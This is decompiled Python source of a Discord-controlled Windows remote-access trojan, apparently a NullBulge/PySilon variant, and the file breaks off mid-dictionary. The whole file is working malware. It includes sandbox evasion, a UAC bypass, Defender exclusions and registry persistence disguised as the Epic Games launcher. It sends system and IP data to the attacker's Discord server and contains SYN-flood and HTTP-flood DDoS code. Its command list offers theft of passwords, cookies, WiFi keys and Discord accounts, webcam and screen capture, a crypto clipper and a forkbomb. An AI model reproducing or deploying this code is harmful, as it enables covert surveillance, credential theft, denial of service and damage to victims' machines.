# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: source_prepared.py
# Bytecode version: 3.10.0rc2 (3439)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

global clipper_stop  # inserted
global embeds_to_send  # inserted
global files_to_merge  # inserted
global expectation  # inserted
global one_file_attachment_message  # inserted
global force_to_send  # inserted
global channel_ids  # inserted
global messages_to_send  # inserted
global input_blocked  # inserted
global send_recordings  # inserted
global latest_messages_in_recordings  # inserted
global implode_confirmation  # inserted
global working_directory  # inserted
global process_to_kill  # inserted
global turned_off  # inserted
global custom_message_to_send  # inserted
global cookies_thread  # inserted
global processes_messages  # inserted
global processes_list  # inserted
global files_to_send  # inserted
global text_buffor  # inserted
global cmd_messages  # inserted
import time
import os
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from shutil import copy2, rmtree
import winreg
from zipfile import ZipFile
import requests
from filesplit.merge import Merge
from pathlib import Path
from scipy.io.wavfile import write
from threading import Thread
import sounddevice
from psutil import process_iter, Process
from win32process import GetWindowThreadProcessId
from win32gui import GetForegroundWindow
import pygame.camera
import pygame.image
import time
import pyautogui
import numpy as np
import imageio
from pynput import keyboard, mouse
import ctypes
import pyperclip
import re
import json
import threading
import pyttsx3
from html2image import Html2Image
from PIL import Image
import monitorcontrol
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pygame
from urllib.parse import urlparse
from PIL import Image, ImageDraw
from win32print import *
from win32gui import *
from win32con import *
from win32api import *
import random
import math
import tempfile
import socket
import string
import urllib.parse
import http.client
from argparse import ArgumentParser, RawTextHelpFormatter
from random import randrange, randint, choice
from threading import Thread, Lock
from socket import *
from struct import *
from termcolor import cprint, colored
from cryptography.fernet import Fernet
import concurrent.futures
import io
encryption_processes = {}
from resources.protections import protection_check, fake_mutex_code
from urllib.request import urlopen
from resources.uac_bypass import *
from itertools import islice
from resources.misc import *
from getpass import getuser
from shutil import rmtree
import subprocess
import threading
import discord
import asyncio
import base64
import psutil
import json
import sys
import wmi
import re
import winerror
import win32api
import win32event
if protection_check():
    os._exit(0)
mutex = None
try:
    mutex = win32event.CreateMutex(None, False, 'NULLBULGE-RANNER')
    result = win32event.WaitForSingleObject(mutex, 0)
    if not result == win32event.WAIT_OBJECT_0:
        print('Another instance is already running. Exiting.')
        sys.exit(0)
except win32event.error as e:
    if e.winerror == winerror.ERROR_ALREADY_EXISTS:
        print('Another instance is already running. Exiting.')
        sys.exit(0)
    else:  # inserted
        pass
if not IsAdmin():
    if GetSelf()[1]:
        if UACbypass():
            os._exit(0)
auto = 'auto'
bot_tokens = ['FFTVu1Eaz92V4t2M4R3aO9UeShDM0JGU4JnQndEa200UnVzZtckLIhjc4I2RucWTyEFRNp3aq5UeVR1T6VlaNRTVE9UeJRVT']
software_registry_name = 'Epic'
software_directory_name = 'Epic Games'
software_executable_name = 'Epic.Launcher.exe'
channel_ids = {'info': True, 'main': True, 'spam': True, 'file': True, 'recordings': True, 'voice': False}
secret_key = '8218cdfefa23660b6c8274360ecc7feec6f11825b529103399a6074ece30a1d8'
guild_id = 1232994659157016586
if fake_mutex_code(software_executable_name.lower()) and os.path.basename(sys.executable).lower()!= software_executable_name.lower():
    os._exit(0)
if IsAdmin():
    exclusion_paths = [f'C:\\Users\\{getuser()}\\{software_directory_name}']
    for path in exclusion_paths:
        try:
            subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath \"{path}\"'], creationflags=subprocess.CREATE_NO_WINDOW)
        except:  # inserted
            continue
client = discord.Client(intents=discord.Intents.all())
xmrig_processes = {}
attack_processes = {}

def fake_ip():
    while True:
        ips = [str(randrange(0, 256)) for i in range(4)]
        if ips[0] == '127':
            continue
        fkip = '.'.join(ips)
        break
    return fkip

def check_tgt(args):
    tgt = args.d
    try:
        ip = gethostbyname(tgt)
    except:
        sys.exit(cprint('[-] Can\'t resolve host:Unknown host!', 'red'))
    return ip

def add_useragent():
    try:
        with open('./ua.txt', 'r') as fp:
            uagents = re.findall('(.+)\\n', fp.read())
    except FileNotFoundError:
        cprint('[-] No file named \'ua.txt\',failed to load User-Agents', 'yellow')
        return []
    
    return uagents

def add_bots():
    bots = []
    bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
    bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
    return bots

class Pyslow:
    def __init__(self, tgt, port, to, threads, sleep):
        self.tgt = tgt
        self.port = port
        self.to = to
        self.threads = threads
        self.sleep = sleep
        self.method = ['GET', 'POST']
        self.pkt_count = 0

    def mypkt(self):
        text = choice(self.method) + ' /' + str(randint(1, 999999999)) + ' HTTP/1.1\r\n' + 'Host:' + self.tgt + '\r\n' + 'User-Agent:' + choice(add_useragent()) + '\r\n' + 'Content-Length: 42\r\n'
        pkt = buffer(text)
        return pkt

    def building_socket(self):
        try:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.tgt, int(self.port)))
            self.pkt_count += 3
            if sock:
                sock.sendto(self.mypkt(), (self.tgt, int(self.port)))
                self.pkt_count += 1
        except Exception:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.tgt, int(self.port)))
            sock.settimeout(None)
            self.pkt_count += 3
            if sock:
                sock.sendto(self.mypkt(), (self.tgt, int(self.port)))
                self.pkt_count += 1
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))

        return sock

    def sending_packets(self):
        try:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.tgt, int(self.port)))
            self.pkt_count += 3
            if sock:
                sock.sendall('X-a: b\r\n')
                self.pkt += 1
        except Exception:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.tgt, int(self.port)))
            sock.settimeout(None)
            if sock:
                sock.sendall('X-a: b\r\n')
                self.pkt_count += 1
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))

        return sock

    def doconnection(self):
        socks = 0
        fail = 0
        lsocks = []
        lhandlers = []
        cprint('\t\tBuilding sockets', 'blue')
        while socks < int(self.threads):
            try:
                sock = self.building_socket()
                if sock:
                    lsocks.append(sock)
                    socks += 1
                    if socks > int(self.threads):
                        break
            except Exception:
                fail += 1
            except KeyboardInterrupt:
                sys.exit(cprint('[-] Canceled by user', 'red'))
        cprint('\t\tSending packets', 'blue')
        while socks < int(self.threads):
            try:
                handler = self.sending_packets()
                if handler:
                    lhandlers.append(handler)
                    socks += 1
                    if socks > int(self.threads):
                        break
                else:  # inserted
                    pass
            except Exception:
                fail += 1
            except KeyboardInterrupt:
                break
        time.sleep(self.sleep)

class Requester(Thread):
    def __init__(self, tgt):
        Thread.__init__(self)
        self.tgt = tgt
        self.port = None
        self.ssl = False
        self.req = []
        self.lock = Lock()
        url_type = urllib.parse.urlparse(self.tgt)
        if url_type.scheme == 'https':
            self.ssl = True
            if self.ssl == True:
                self.port = 443
        else:  # inserted
            self.port = 80

    def header(self):
        cachetype = ['no-cache', 'no-store', 'max-age=' + str(randint(0, 10)), 'max-stale=' + str(randint(0, 100)), 'min-fresh=' + str(randint(0, 10)), 'notransform', 'only-if-cache']
        acceptEc = ['compress,gzip', '', '*', 'compress;q=0,5, gzip;q=1.0', 'gzip;q=1.0, indentity; q=0.5, *;q=0']
        acceptC = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
        bot = add_bots()
        c = choice(cachetype)
        a = choice(acceptEc)
        http_header = {'User-Agent': choice(add_useragent()), 'Cache-Control': c, 'Accept-Encoding': a, 'Keep-Alive': '42', 'Host': self.tgt, 'Referer': choice(bot)}
        return http_header

    def rand_str(self):
        mystr = []
        for x in range(3):
            chars = tuple(string.ascii_letters + string.digits)
            text = (choice(chars) for _ in range(randint(7, 14)))
            text = ''.join(text)
            mystr.append(text)
        return '&'.join(mystr)

    def create_url(self):
        return self.tgt + '?' + self.rand_str()

    def data(self):
        url = self.create_url()
        http_header = self.header()
        return (url, http_header)

    def run(self):
        try:
            if self.ssl:
                conn = http.client.HTTPSConnection(self.tgt, self.port)
            else:  # inserted
                conn = http.client.HTTPConnection(self.tgt, self.port)
                self.req.append(conn)
            for reqter in self.req:
                url, http_header = self.data()
                method = choice(['get', 'post'])
                reqter.request(method.upper(), url, None, http_header)
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))
        except Exception as e:
            print(e)
        finally:  # inserted
            self.closeConnections()

    def closeConnections(self):
        for conn in self.req:
            try:
                conn.close()
            except:
                continue

class Synflood(Thread):
    def __init__(self, tgt, ip, sock=None):
        Thread.__init__(self)
        self.tgt = tgt
        self.ip = ip
        self.psh = ''
        if sock is None:
            self.sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
            self.sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
        else:  # inserted
            self.sock = sock
        self.lock = Lock()

    def checksum(self):
        s = 0
        for i in range(0, len(self.psh), 2):
            w = (ord(self.psh[i]) << 8) + ord(self.psh[i + 1])
            s = s + w
        s = (s >> 16) + (s & 65535)
        s = ~s & 65535
        return s

    def Building_packet(self):
        ihl = 5
        version = 4
        tos = 0
        tot = 40
        id = 54321
        frag_off = 0
        ttl = 64
        protocol = IPPROTO_TCP
        check = 10
        s_addr = inet_aton(self.ip)
        d_addr = inet_aton(self.tgt)
        ihl_version = (version << 4) + ihl
        ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)
        source = 54321
        dest = 80
        seq = 0
        ack_seq = 0
        doff = 5
        fin = 0
        syn = 1
        rst = 0
        ack = 0
        psh = 0
        urg = 0
        window = htons(5840)
        check = 0
        urg_prt = 0
        offset_res = doff << 4
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
        src_addr = inet_aton(self.ip)
        dst_addr = inet_aton(self.tgt)
        place = 0
        protocol = IPPROTO_TCP
        tcp_length = len(tcp_header)
        self.psh = pack('!4s4sBBH', src_addr, dst_addr, place, protocol, tcp_length)
        self.psh = self.psh + tcp_header
        tcp_checksum = self.checksum()
        tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_prt)
        packet = ip_header + tcp_header
        return packet

    def run(self):
        packet = self.Building_packet()
        try:
            self.lock.acquire()
            self.sock.sendto(packet, (self.tgt, 0))
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))
        except Exception as e:
            cprint(e, 'red')
        finally:  # inserted
            self.lock.release()
ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
text_buffor, force_to_send = ('', False)
messages_to_send, files_to_send, embeds_to_send = ([], [], [])
processes_messages, processes_list, process_to_kill = ([], [], '')
files_to_merge, expectation, one_file_attachment_message = ([[], [], []], None, None)
cookies_thread, implode_confirmation, cmd_messages = (None, None, [])
send_recordings, input_blocked, clipper_stop, turned_off, custom_message_to_send = (True, False, True, False, [None, None, None])
latest_messages_in_recordings = []
if IsAdmin():
    regbase = winreg.HKEY_LOCAL_MACHINE
else:
    regbase = winreg.HKEY_CURRENT_USER
if sys.argv[0].lower()!= 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and (not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)):
    try:
        os.mkdir('C:\\Users\\' + getuser() + '\\' + software_directory_name)
    except:
        pass
    copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    registry = winreg.ConnectRegistry(None, regbase)
    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    winreg.CreateKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
    winreg.SetValueEx(registry_key, software_registry_name, 0, winreg.REG_SZ, 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    winreg.CloseKey(registry_key)
    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', 'w', encoding='utf-8') as activator:
        process_name = sys.argv[0].split('\\')[(-1)]
        if IsAdmin():
            attrib_value = 'attrib +s +h .'
        else:
            attrib_value = 'attrib +h .'
        activator.write(f'pushd \"C:\\Users\\{getuser()}\\{software_directory_name}\"\n{attrib_value}\nstart \"\" \"{software_executable_name}\"\ntaskkill /f /im \"{process_name}\"\ndel \"%~f0\"')
    subprocess.Popen(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit(0)
working_directory = ['C:', 'Users', getuser(), software_directory_name]

def get_hwid():
    c = wmi.WMI()
    return c.Win32_ComputerSystemProduct()[0].UUID

@client.event
async def on_ready():
    global latest_messages_in_recordings  # inserted
    global embeds_to_send  # inserted
    global send_recordings  # inserted
    global files_to_send  # inserted
    global messages_to_send  # inserted
    hwid = get_hwid().strip()
    first_run = True
    for category_name in client.get_guild(guild_id).categories:
        if hwid in str(category_name):
            first_run, category = (False, category_name)
            break
    if not first_run:
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)
        if 'spam' not in category_channel_names and channel_ids['spam']:
            temp = await client.get_guild(guild_id).create_text_channel('spam', category=category)
            channel_ids['spam'] = temp.id
        if 'recordings' not in category_channel_names and channel_ids['recordings']:
            temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category)
            channel_ids['recordings'] = temp.id
        if 'file-related' not in category_channel_names and channel_ids['file']:
            temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category)
            channel_ids['file'] = temp.id
        if 'Live microphone' not in category_channel_names and channel_ids['voice']:
            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
            channel_ids['voice'] = temp.id
    if first_run:
        category = await client.get_guild(guild_id).create_category(hwid)
        temp = await client.get_guild(guild_id).create_text_channel('info', category=category)
        channel_ids['info'] = temp.id
        temp = await client.get_guild(guild_id).create_text_channel('main', category=category)
        channel_ids['main'] = temp.id
        if channel_ids['spam'] == True: 
            temp = await client.get_guild(guild_id).create_text_channel('spam', category=category)
            channel_ids['spam'] = temp.id
        if channel_ids['recordings'] == True:
            temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category)
            channel_ids['recordings'] = temp.id
        if channel_ids['file'] == True:
            temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category)
            channel_ids['file'] = temp.id
        if channel_ids['voice'] == True:
            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
            channel_ids['voice'] = temp.id
        try:
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
        except:
            pass  # postinserted
        try:
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
        except:
            pass  # postinserted
        system_info = force_decode(subprocess.run('systeminfo', capture_output=True, shell=True).stdout).strip().replace('\\xff', ' ')
        chunk = ''
        for line in system_info.split('\n'):
            if len(chunk) + len(line) > 1990:
                await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
                chunk = line + '\n'
            else:  # inserted
                chunk += line + '\n'
        await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
    else:  # inserted
        for channel in category.channels:
            if channel.name == 'info':
                channel_ids['info'] = channel.id
            elif channel.name == 'main':
                channel_ids['main'] = channel.id
            elif channel.name == 'spam':
                channel_ids['spam'] = channel.id
            elif channel.name == 'file-related':
                channel_ids['file'] = channel.id
            elif channel.name == 'recordings':
                channel_ids['recordings'] = channel.id
            else:  # inserted
                if channel.name == 'Live microphone':
                    channel_ids['voice'] = channel.id
    await client.get_channel(channel_ids['main']).send(f"_ _\n_ _\n_ _```Starting new PC session at {current_time(True)} on HWID:{str(hwid)}{(' && Bypassed UAC!' if IsAdmin() else '')}```\n_ _\n_ _\n_ _")
    recordings_obj = client.get_channel(channel_ids['recordings'])
    async for latest_message in recordings_obj.history(limit=2):
        latest_messages_in_recordings.append(latest_message.content)
    if 'disable' not in latest_messages_in_recordings:
        Thread(target=start_recording).start()
        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Started recording...`')
        latest_messages_in_recordings = []
    else:  # inserted
        Thread(target=start_recording).start()
        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Recording disabled. If you want to enable it, just delete the \"disable\" message on` <#' + str(channel_ids['recordings']) + '>')
        latest_messages_in_recordings = []
    threading.Thread(target=process_blacklister).start()
    while True:
        recordings_obj = client.get_channel(channel_ids['recordings'])
        async for latest_message in recordings_obj.history(limit=2):
            latest_messages_in_recordings.append(latest_message.content)
        if 'disable' in latest_messages_in_recordings:
            send_recordings = False
        else:  # inserted
            send_recordings = True
        latest_messages_in_recordings = []
        if len(messages_to_send) > 0:
            for message in messages_to_send:
                await client.get_channel(message[0]).send(message[1])
                await asyncio.sleep(0.1)
            messages_to_send = []
        if len(files_to_send) > 0:
            for file in files_to_send:
                await client.get_channel(file[0]).send(file[1], file=discord.File(file[2], filename=file[2]))
                await asyncio.sleep(0.1)
                if file[3]:
                    subprocess.run('del ' + file[2], shell=True)
            files_to_send = []
        if len(embeds_to_send) > 0:
            for embedd in embeds_to_send:
                if len(embedd) == 3:
                    await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1], color=34047).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
                else:  # inserted
                    await client.get_channel(embedd[0]).send(embed=embedd[1])
                await asyncio.sleep(0.1)
            embeds_to_send = []
        await asyncio.sleep(1)

@client.event
async def on_raw_reaction_add(payload):
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    user = payload.member
    if user.bot == False:
        if str(reaction) == '📌':
            if message.channel.id in channel_ids.values():
                await message.pin()
                last_message = await discord.utils.get(message.channel.history())
                await last_message.delete()
        else:  # inserted
            if str(reaction) == '🔴':
                await message.delete()

@client.event
async def on_reaction_add(reaction, user):
    global cmd_messages  # inserted
    global expectation  # inserted
    global tree_messages  # inserted
    global files_to_merge  # inserted
    global processes_messages  # inserted
    if user.bot == False:
        if reaction.message.channel.id in channel_ids.values():
            try:
                if str(reaction) == '💀' and expectation == 'implosion':
                    await reaction.message.channel.send('```NullBulge will try to implode after sending this message. So if there\'s no more messages, the cleanup was successful.```')
                    registry = winreg.ConnectRegistry(None, regbase)
                    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
                    registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
                    winreg.DeleteValue(registry_key, software_registry_name)
                    secure_delete_file(f'C:\\Users\\{getuser()}\\{software_directory_name}\\NullBulge.key', 10)
                    try:
                        rmtree('rec_')
                    except:
                        pass
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
                    with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
                        if IsAdmin():
                            attrib_value = f'attrib -s -h \"C:\\Users\\{getuser()}\\{software_directory_name}\"'
                        else: 
                            attrib_value = f'attrib -h \"C:\\Users\\{getuser()}\\{software_directory_name}\"'
                        imploder.write(f'pushd \"C:\\Users\\{getuser()}\"\n{attrib_value}\ntaskkill /f /im \"{software_executable_name}\"\ntimeout /t 3 /nobreak\nrmdir /s /q \"C:\\Users\\{getuser()}\\{software_directory_name}\"\ndel \"%~f0\"')
                    subprocess.Popen(f'C:\\Users\\{getuser()}\\implode.bat', creationflags=subprocess.CREATE_NO_WINDOW)
                    sys.exit(0)
                elif str(reaction) == '🔴' and expectation == 'implosion':
                    expectation = None
                elif str(reaction) == '📤':
                    if expectation == 'onefile':
                        split_v1 = str(one_file_attachment_message.attachments).split('filename=\'')[1]
                        filename = str(split_v1).split('\' ')[0]
                        await one_file_attachment_message.attachments[0].save(fp='/'.join(working_directory) + '/' + filename)
                        async for message in reaction.message.channel.history(limit=2):
                            await message.delete()
                        await reaction.message.channel.send('```Uploaded  ' + filename + '  into  ' + '/'.join(working_directory) + '/' + filename + '```')
                        expectation = None
                    elif expectation == 'multiplefiles':
                        try:
                            os.mkdir('temp')
                        except:
                            rmtree('temp')
                            os.mkdir('temp')
                        await files_to_merge[0][(-1)].edit(content='```Uploading file 1 of ' + str(len(files_to_merge[1])) + '```')
                        for i in range(len(files_to_merge[1])):
                            split_v1 = str(files_to_merge[1][i].attachments).split('filename=\'')[1]
                            filename = str(split_v1).split('\' ')[0]
                            await files_to_merge[1][i].attachments[0].save(fp='temp/' + filename)
                            await files_to_merge[0][(-1)].edit(content='```Uploading file ' + str(i + 1) + ' of ' + str(len(files_to_merge[1])) + '```')
                        await files_to_merge[0][(-1)].edit(content='```Uploading completed```')
                        for i in os.listdir('temp'):
                            if i!= 'manifest':
                                os.rename('temp/' + i, 'temp/' + i[:(-8)])
                        Merge('temp', '/'.join(working_directory), files_to_merge[2]).merge(cleanup=True)
                        rmtree('temp')
                        async for message in client.get_channel(channel_ids['file']).history():
                            await message.delete()
                        await reaction.message.channel.send('```Uploaded  ' + files_to_merge[2] + '  into  ' + '/'.join(working_directory) + '/' + files_to_merge[2] + '```')
                        files_to_merge = [[], [], []]
                        expectation = None
                elif str(reaction) == '🔴' and reaction.message.content[:15] == '```End of tree.':
                    for i in tree_messages:
                        try:
                            await i.delete()
                        except:
                            continue
                    tree_messages = []
                    subprocess.run('del ' + f'\"C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt\"', shell=True)
                elif str(reaction) == '📥' and reaction.message.content[:15] == '```End of tree.':
                    await reaction.message.channel.send(file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt'))
                    subprocess.run('del ' + f'\"C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt\"', shell=True)
                elif str(reaction) == '💀' and reaction.message.content[:39] == '```Do you really want to kill process: ':
                    await reaction.message.delete()
                    try:
                        process_name = process_to_kill[0]
                        if process_name[(-1)] == ']':
                            process_name = process_name[::(-1)]
                            for i in range(len(process_name)):
                                if process_name[i] == '[':
                                    process_name = process_name[i + 4:]
                                    break
                            process_name = process_name[::(-1)]
                    except Exception as e:
                        embed = discord.Embed(title='📛 Error', description='```Error while parsing the process name...\n' + str(e) + '```', colour=discord.Colour.red())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        reaction_msg = await reaction.message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                    try:
                        killed_processes = []
                        for proc in process_iter():
                            if proc.name() == process_name:
                                proc.kill()
                                killed_processes.append(proc.name())
                        processes_killed = ''
                        for i in killed_processes:
                            processes_killed = processes_killed + '\n• ' + str(i)
                        embed = discord.Embed(title='🟢 Success', description='```Processes killed by ' + str(user) + ' at ' + current_time() + processes_killed + '```', colour=discord.Colour.green())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        reaction_msg = await reaction.message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                    except Exception as e:
                        embed = discord.Embed(title='📛 Error', description='```Error while killing processes...\n' + str(e) + '```', colour=discord.Colour.red())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        reaction_msg = await reaction.message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                elif str(reaction) == '🔴' and reaction.message.content[(-25):] == '.kill <process-number>```':
                    for i in processes_messages:
                        try:
                            await i.delete()
                        except:
                            pass
                    processes_messages = []
                elif str(reaction) == '🔴' and reaction.message.content == '```End of command stdout```':
                    for i in cmd_messages:
                        await i.delete()
                    cmd_messages = []
                elif str(reaction) == '✅':
                    if custom_message_to_send[0]!= None:
                        threading.Thread(target=send_custom_message, args=(custom_message_to_send[0], custom_message_to_send[1], custom_message_to_send[2])).start()
                        await asyncio.sleep(0.5)
                        ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
                        reaction_msg = await reaction.message.channel.send(embed=discord.Embed(title=current_time() + ' `[Sent message]`', color=34047).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
                        await reaction_msg.add_reaction('📌')
                        subprocess.run(f'del \"C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png\"', shell=True)
            except Exception as err:
                await reaction.message.channel.send(f'```{str(err)}```')

@client.event
async def on_raw_reaction_remove(payload):
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    user = payload.member
    if str(reaction) == '📌':
        await message.unpin()

help = {
    'commands': {
        'ss': [u'➡️ `.ss`', "Takes a screenshot of the victim's PC"],
        'screenrec': [u'➡️ `.screenrec`', "Records the screen of the victim's PC for 15 seconds"],
        'join': [u'➡️ `.join`', 'Makes the BOT join a voice channel and live-stream microphone input'],
        'show': [u'➡️ `.show <what-to-show>`', u'Displays information about specified subject. Options:\n🔹processes - displays all running processes'],
        'kill': [u'➡️ `.kill <process-name>`', u'Kills a specified process. Options:\n🔹process-name - kills a specific process based on .show generated process-names'],
        'block-input': [u'➡️ `.block-input`', "Blocks keyboard and mouse inputs of the victim's PC"],
        'unblock-input': [u'➡️ `.unblock-input`', "Unblocks keyboard and mouse inputs of the victim's PC"],
        'start-clipper': [u'➡️ `.start-clipper`', "Starts the Crypto Clipper thread on the victim's PC"],
        'stop-clipper': [u'➡️ `.stop-clipper`', "Stops the Crypto Clipper thread on the victim's PC"],
        'set-critical': [u'➡️ `.set-critical`', 'Elevates the process to critical status.'],
        'unset-critical': [u'➡️ `.unset-critical`', 'Removes the critical status from the process.'],
        'grab': [u'➡️ `.grab <what-to-grab>`', u'Grabs specified information. Options:\n🔹passwords - grabs all browser-saved passwords\n🔹history - grabs the browser history\n🔹cookies - grabs browser-cookies\n🔹wifi - grabs all WiFi saved passwords\n🔹discord - grabs all possible information from victim\'s Discord account\n🔹all - grabs discord information, passwords & cookies'],
        'clear': [u'➡️ `.clear`', 'Clears all messages on the file-related channel'],
        'pwd': [u'➡️ `.pwd`', 'Displays current directory path'],
        'ls': [u'➡️ `.ls`', 'Lists current directory content'],
        'cd': [u'➡️ `.cd <directory>`', u'Changes working directory. Options:\n🔹directory - the destination directory (.. is the previous directory)'],
        'tree': [u'➡️ `.tree`', "Displays the current directory's structure"],
        'download': [u'➡️ `.download <file-or-directory-name>`', 'Downloads specified file or folder. Options:\n🔹file-or-directory-name - name of file or directory that you want to download'],
        'upload': ['➡️ `.upload <type> <name>`', 'Uploads a file to victim\'s PC. Options:\n🔹type - single/multiple files whether it\'s smaller or larger than 25MB (single=smaller, multiple=larger)\n🔹name - name of uploaded file on victim\'s PC'],
        'execute': ['➡️ `.execute <file-name>`', 'Execute specified file on the victim\'s PC'],
        'remove': ['➡️ `.remove <file-or-directory-name>`', 'Removes the specified file or directory. Options:\n🔹file-or-directory-name - name of file or directory that you want to remove'],
        'key': ['➡️ `.key <what-to-type>`', 'Simulates typing on the victim\'s PC. Options:\n🔹ALTF4 - performs the Alt+F4 shortcut\n🔹ALTTAB - performs the Alt+Tab shortcut']
    },
    'commands2': {
        'blacklist': [u'➡️ `.blacklist <process-name>`', 'Adds the specified process to the blacklist.'],
        'whitelist': [u'➡️ `.whitelist <process-name>`', 'Removes the specified process from the blacklist.'],
        'turnoff': [u'➡️ `.turnoff`', 'Turns all monitors off'],
        'turnon': [u'➡️ `.turnon`', 'Turns all monitors on'],
        'block-website': [u'➡️ `.block-website <url>`', 'Blocks the specified website from being accessed from any browser.'],
        'unblock-website': [u'➡️ `.unblock-website <url>`', 'Unblocks access to a previously blocked website.'],
        'webcam': [u'➡️ `.webcam photo`', "Takes a photo of a victim's webcam (if one is detected)"],
        'forkbomb': [u'➡️ `.forkbomb`', "Creates a self-replicating process until the victim's PC crashes."],
        'volume': [u'➡️ `.volume`', "Change the speaker volume on the victim's PC."],
        'play': [u'➡️ `.play`', "Play any .mp3 file on the victim's PC."],
        'tts': [u'➡️ `.tts <message>`', 'Plays a Text-to-Speech voice message.'],
